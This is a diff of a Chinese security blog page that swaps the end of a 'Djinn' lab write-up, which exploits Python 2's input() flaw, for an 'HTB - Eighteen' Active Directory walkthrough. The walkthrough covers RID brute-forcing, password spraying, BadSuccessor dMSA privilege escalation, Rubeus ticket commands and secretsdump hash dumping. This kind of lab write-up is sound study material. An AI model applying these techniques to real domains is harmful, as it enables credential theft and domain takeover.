&#x27;Better Luck next time&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def readfiles():</span><br><span class="line">    user = getuser()</span><br><span class="line">    path = input(&#x27;Enter the full of the file to read: &#x27;)</span><br><span class="line">    print &#x27;User %s is not allowed to read %s&#x27; % (user, path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def options():</span><br><span class="line">    print &#x27;What do you want to do ?&#x27;</span><br><span class="line">    print &#x27;1 - Be naughty&#x27;</span><br><span class="line">    print &#x27;2 - Guess the number&#x27;</span><br><span class="line">    print &#x27;3 - Read some damn files&#x27;</span><br><span class="line">    print &#x27;4 - Work&#x27;</span><br><span class="line">    choice = int(input(&#x27;Enter your choice: &#x27;))</span><br><span class="line">    return choice</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(op):</span><br><span class="line">    if op == 1:</span><br><span class="line">        naughtyboi()</span><br><span class="line">    elif op == 2:</span><br><span class="line">        guessit()</span><br><span class="line">    elif op == 3:</span><br><span class="line">        readfiles()</span><br><span class="line">    elif op == 4:</span><br><span class="line">        print &#x27;work your ass off!!&#x27;</span><br><span class="line">    else:</span><br><span class="line">        print &#x27;Do something better with your life&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main(options())</span><br></pre></td></tr></table></figure></div>
-
-<p>仔细审计之后发现这里的input函数，可以确定是python2的版本。搜一下python input() vulnerability，看看input函数的漏洞。果然还是被👴发现了，参考文章：<a class="link"   target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/" >https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p>根据这个漏洞，可以把变量名当成变量的内容来解析，我们可以直接在Guess the number中输入“num“利用此漏洞即可。至此，我们获得了root权限。</p>
-<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/12/04/Q1pOvq.png"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://s2.ax1x.com/2019/12/04/Q1pOvq.png"
-                      alt="Q1pOvq.png"
-                ></a></p>
-<h2 id="总结复盘"><a href="#总结复盘" class="headerlink" title="总结复盘"></a>总结复盘</h2><p>打靶过程中没顺便写wp图片啥的都是偷别的师傅的，这靶机提权思路有点东西。python2的input漏洞也确实没有任何知识储备可言。</p>
-<p>活该我打不出来！！！</p>
-<p>学到了什么？一点思考是之前有命令执行但是被过滤的情况我第一个想到了这个项目</p>
+<h3 id="3-Initial-Foothold-获取立足点"><a href="#3-Initial-Foothold-获取立足点" class="headerlink" title="3. Initial Foothold (获取立足点)"></a>3. Initial Foothold (获取立足点)</h3><h4 id="漏洞利用-Exploitation"><a href="#漏洞利用-Exploitation" class="headerlink" title="漏洞利用 (Exploitation)"></a>漏洞利用 (Exploitation)</h4><p>这下子我们有了一个密码，但是没有用户名，怎么办？<code>nxc</code> (NetExec) 的 mssql 模块也是可以 rid-brute 的，跑一下 <strong>rid-brute</strong> 拿到一个 userlist，而后用 userlist 进行密码喷洒。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411084541704.png"
-                      alt="image-20250411084541704"
-                ><a class="link"   target="_blank" rel="noopener" href="https://probiusofficial.github.io/bashFuck/" >https://probiusofficial.github.io/bashFuck/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p>之前打CTF时候遇到过极限命令执行，但是从来没有实践过，想着这次终于能用了，结果绕过了之后执行没任何效果。不知道问题出在哪了。要是后来有师傅能看到这里了的话请务必GitHub上提个issue告诉我一下</p>
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120220950185.png"
+                      alt="image-20251120220950185"
+                ></p>
+<p>得到了一个可以 WinRM 登录的用户 <code>adam.scott</code>。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120221959372.png"
+                      alt="image-20251120221959372"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120223110867.png"
+                      alt="image-20251120223110867"
+                ></p>
+<p>先上 <strong>SharpHound</strong> 看一眼 AD 有什么。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120225021323.png"
+                      alt="image-20251120225021323"
+                ></p>
+<p>似乎没什么东西，当前用户什么都干不了。先把靶机的 LDAP 代理过来看看吧。</p>
+<h3 id="4-Privilege-Escalation-权限提升"><a href="#4-Privilege-Escalation-权限提升" class="headerlink" title="4. Privilege Escalation (权限提升)"></a>4. Privilege Escalation (权限提升)</h3><h4 id="Information-Gathering-内部侦察"><a href="#Information-Gathering-内部侦察" class="headerlink" title="Information Gathering (内部侦察)"></a>Information Gathering (内部侦察)</h4><p>通过 BloodHound 枚举 Writable 权限：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120225934775.png"
+                      alt="image-20251120225934775"
+                ></p>
+<p>可以发现我们拥有对 Staff 的 <code>create_child</code> 权限。再详细看看。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120233338919.png"
+                      alt="image-20251120233338919"
+                ></p>
+<p>可以看到有 <code>msDS-DelegatedManagedServiceAccount: CREATE_CHILD</code>，查阅资料得知这个可以利用 <strong>BadSuccessor</strong> 攻击。</p>
 
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <i class="notel-icon fa-solid fa-book"></i><p>BadSuccessor?</p>
+
+    </div>
+    <div class="notel-content">
+      <p> <strong>DMSA (Delegated Managed Service Account)</strong> 是 Windows Server 2025（以及部分 Server 2022 更新）引入的概念。它的核心目的是实现 <strong>“无缝迁移”</strong> 和 <strong>“身份解耦”</strong>。</p>
+<ul>
+<li><strong>设计目标</strong>：让服务账号不再死板地绑定在某台机器上，并且允许旧账号平滑过渡到新账号。</li>
+<li><strong>核心特性</strong>：<ul>
+<li><strong>短期凭据</strong>：DMSA 使用基于 Kerberos 的短期凭据，而不是长期静态密码。</li>
+<li><strong>身份继承 (Identity Inheritance)</strong>：这是万恶之源。为了让旧服务无缝切换到新服务，DMSA 允许被配置为“继承”另一个账户（Predecessor&#x2F;Legacy Account）的身份和权限。</li>
+</ul>
+</li>
+</ul>
+<p><strong>BadSuccessor</strong> 利用了这种迁移流。通常创建 dMSA 以替换现有旧服务帐户。若要实现无缝转换，dMSA 可以通过执行<em>迁移</em>过程来“继承”旧帐户的权限。 </p>
+
+    </div>
+  </div>
+
+<h4 id="Exploitation-提权过程"><a href="#Exploitation-提权过程" class="headerlink" title="Exploitation (提权过程)"></a>Exploitation (提权过程)</h4><p>参考这两篇文章来进行利用：</p>
+<a class="button  regular" target="_blank" rel="noopener" href='https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory' title='Akamai Research'><i class='fa-solid fa-globe'></i> Akamai Research</a> <a class="button  regular" target="_blank" rel="noopener" href='https://kreep.in/badsuccessor-abusing-dmsas-for-ad-domination/' title='Kreep.in - BadSuccessor'><i class='fa-solid fa-globe'></i> Kreep.in - BadSuccessor</a>
+
+<p>首先上传 <strong>BadSuccessor</strong> 上去进行利用。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120235729871.png"
+                      alt="image-20251120235729871"
+                ></p>
+<p>当我想继续按照上面利用的时候产生了这个报错，在这个地方卡了我很多时间。</p>
+
+  <div class="note p-4 mb-4 rounded-small danger icon-padding">
+    <i class="note-icon fa-solid fa-bug"></i><p> <strong>Error Encountered:</strong></p>
+<p>PowerShell</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; ./Rubeus.exe dump /luid:0xf12ab7 /service:krbtgt /nowrap</span><br><span class="line">Action: Dump Kerberos Ticket Data (Current User)</span><br><span class="line">[X] You need to be in high integrity for the actions specified.</span><br><span class="line">[!] Unhandled Rubeus exception:</span><br><span class="line">System.NullReferenceException: Object reference not set to an instance of an object.</span><br><span class="line">   at Rubeus.LSA.DisplaySessionCreds(List`1 sessionCreds, TicketDisplayFormat displayFormat, Boolean showAll)</span><br><span class="line">   at Rubeus.Commands.Dump.Execute(Dictionary`2 arguments)</span><br><span class="line">   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)</span><br><span class="line">   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; ./r.exe triage</span><br><span class="line">Action: Triage Kerberos Tickets (Current User)</span><br><span class="line">[*] Current LUID    : 0xf12ab7</span><br><span class="line"> ---------------------------------------</span><br><span class="line"> | LUID | UserName | Service | EndTime |</span><br><span class="line"> ---------------------------------------</span><br><span class="line"> ---------------------------------------</span><br></pre></td></tr></table></figure></div>
+
+  </div>
+
+<p>我们已经创建了一个名为 <code>enc_dmsa</code> 的账户并将它设置成为继承 <code>admin</code> 的 badsuccessor 的利用状态，我们下一步手动请求它的 TGS。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251121001551560.png"
+                      alt="image-20251121001551560"
+                ></p>
+<p>这个票据就具有和 <code>administrator</code> 相同的权限了，所以 <code>secretsdump</code> 出来 hash。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251121002254410.png"
+                      alt="image-20251121002254410"
+                ></p>
+<p>接下来以 admin 登录就能获取到 root.txt。</p>
+<h3 id="5-Conclusion-总结与复盘"><a href="#5-Conclusion-总结与复盘" class="headerlink" title="5. Conclusion (总结与复盘)"></a>5. Conclusion (总结与复盘)</h3><h4 id="攻击路径回顾"><a href="#攻击路径回顾" class="headerlink" title="攻击路径回顾"></a>攻击路径回顾</h4><ol>
+<li><strong>端口探测与服务发现</strong>: 通过 Nmap 扫描发现 <strong>1433 (MSSQL)</strong>、<strong>80 (Web)</strong> 和 <strong>5985 (WinRM)</strong> 端口。</li>
+<li><strong>数据库渗透与哈希破解</strong>: 使用初始凭据登录 MSSQL，利用 <strong>Impersonation (用户模拟)</strong> 提权至 <code>appdev</code> 用户。获取 Web Admin 的 <strong>PBKDF2</strong> 哈希并破解。</li>
+<li><strong>横向移动</strong>: 利用 <strong>NetExec</strong> 进行 <strong>RID Brute-force</strong> 枚举域用户列表。配合破解得到的密码进行 <strong>Password Spraying</strong>，获取 <code>adam.scott</code> 权限。</li>
+<li><strong>域内权限分析</strong>: 发现当前用户在 <code>Staff</code> 容器上拥有 <strong>CreateChild</strong> 权限，且具备操作 <strong>DMSA</strong> 的相关属性。</li>
+<li><strong>DMSA 漏洞提权</strong>: 利用 <strong>BadSuccessor</strong> 创建恶意的 dMSA 账户并“继承”域管权限。</li>
+<li><strong>最终提权</strong>: 导出域控制器哈希（DCSync），获取 Administrator 权限。</li>
+</ol>
+<h4 id="知识点-Key-Learnings"><a href="#知识点-Key-Learnings" class="headerlink" title="知识点 (Key Learnings)"></a>知识点 (Key Learnings)</h4>
+  <div class="note-large orange">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <i class="notel-icon fa-solid fa-graduation-cap"></i><p>知识点总结</p>
+
+    </div>
+    <div class="notel-content">
+      <ul>
+<li><strong>MSSQL Impersonation (用户模拟)</strong>: MSSQL 中的 <code>EXECUTE AS</code> 语句允许用户模拟其他数据库用户。如果低权限数据库账户被授予了高权限账户的 <code>IMPERSONATE</code> 权限，攻击者可以在数据库内部横向移动甚至提权。</li>
+<li><strong>非标准 Hash 格式处理</strong>: Web 框架（如 Flask&#x2F;Werkzeug）生成的 PBKDF2 哈希格式可能与 Hashcat 的标准格式不同。在破解失败时，应检查哈希各字段的编码格式，必要时使用脚本进行转换（Base64 解码&#x2F;编码）。</li>
+<li><strong>RID Brute-force (RID 爆破)</strong>: 在拥有有效凭据但不知道有效用户名列表时，可以通过枚举 SID 的最后一部分（RID）来反查对应的用户名。</li>
+<li><strong>DMSA (Delegated Managed Service Account) 安全风险</strong>: 利用 <code>msDS-DelegatedManagedServiceAccount</code> 属性和 <code>CreateChild</code> 权限，创建一个新的 dMSA 并将其“前任”设置为高权限账户。由于逻辑缺陷，系统会允许这个新账户获取旧账户的权限凭据（TGS）。<ul>
+<li><strong>关键工具</strong>: <code>BadSuccessor</code>, <code>Rubeus</code>, <code>impacket-secretsdump</code></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+  </div>
 		</div>
 
 		
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> Djinn</li>
+        <li><strong>Title:</strong> HTB - Eighteen Writeup</li>
         <li><strong>Author:</strong> EnchanterW</li>
         <li><strong>Created at
-                :</strong> 2025-04-11 16:00:00</li>
+                :</strong> 2025-11-21 01:00:00</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-09-20 20:06:49
+                    :</strong> 2025-11-21 01:17:53
             </li>
         
         <li>
-            <strong>Link:</strong> https://enchanter-w.github.io/2025/04/11/Djinn/
+            <strong>Link:</strong> https://enchanter-w.github.io/2025/11/21/HTB_eighteen/
         </li>
         <li>
             <strong>
@@ -846,19 +919,23 @@
 		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>&nbsp;
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
 			</li>
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/CTF/">#CTF</a>&nbsp;
+				<a href="/tags/Windows/">#Windows</a>&nbsp;
 			</li>
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/pyc%E5%8F%8D%E7%BC%96%E8%AF%91/">#pyc反编译</a>&nbsp;
+				<a href="/tags/MSSQL/">#MSSQL</a>&nbsp;
 			</li>
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/RCE%E7%BB%95%E8%BF%87/">#RCE绕过</a>&nbsp;
+				<a href="/tags/Active-Directory/">#Active Directory</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/DMSA/">#DMSA</a>&nbsp;
 			</li>
 			
 		</ul>
@@ -869,23 +946,11 @@
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/04/11/DeRPnStiNK/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item">Derpnstink靶机</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/04/10/Sar/">
+				<a class="next" rel="next" href="/2025/11/09/HTB_Giveback/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item">Sar</span>
+						<span class="post-nav-title-item">HTB_Giveback</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -960,8 +1025,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">Djinn</div>
-		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE"><span class="nav-text">靶机发现端口信息枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B-%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="nav-text">端口探测&amp;服务探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1337%E7%AB%AF%E5%8F%A3"><span class="nav-text">1337端口</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="nav-text">web服务探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%8B%E8%B6%B3%E7%82%B9%E8%8E%B7%E5%8F%96"><span class="nav-text">立足点获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">机器信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%A4%8D%E7%9B%98"><span class="nav-text">总结复盘</span></a></li></ol>
+		<div class="page-title">HTB - Eighteen Writeup</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTB-Eighteen-Writeup"><span class="nav-text">[HTB-Eighteen] Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Reconnaissance-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. Reconnaissance (信息收集)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Enumeration-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="nav-text">2. Enumeration (服务枚举)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Initial-Foothold-%E8%8E%B7%E5%8F%96%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="nav-text">3. Initial Foothold (获取立足点)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Privilege-Escalation-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">4. Privilege Escalation (权限提升)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Conclusion-%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%9B%98"><span class="nav-text">5. Conclusion (总结与复盘)</span></a></li></ol></li></ol>
 
 	</div>
 </div>
